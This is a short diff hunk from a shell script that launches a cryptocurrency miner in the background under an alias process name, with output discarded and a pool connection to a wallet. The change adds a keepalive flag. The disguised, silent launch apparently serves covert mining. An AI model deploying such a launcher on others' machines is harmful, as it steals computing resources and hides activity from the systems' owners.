@@ -27,5 +27,5 @@ sleep $sleep_time
 
 ### LAUNCH MINER IN BACKGROUND ###
 echo "[*] Starting miner..."
-nohup ./$ALIAS_NAME -o $POOL -u $WALLET -k -p $WORKER_ID --tls -t $THREADS --donate-level 1 > /dev/null 2>&1 &
+nohup ./$ALIAS_NAME -o $POOL -u $WALLET -k -p $WORKER_ID --tls --keepalive -t $THREADS --donate-level 1 > /dev/null 2>&1 &
 echo "[+] Mining started with alias '$ALIAS_NAME'. Check running processes."
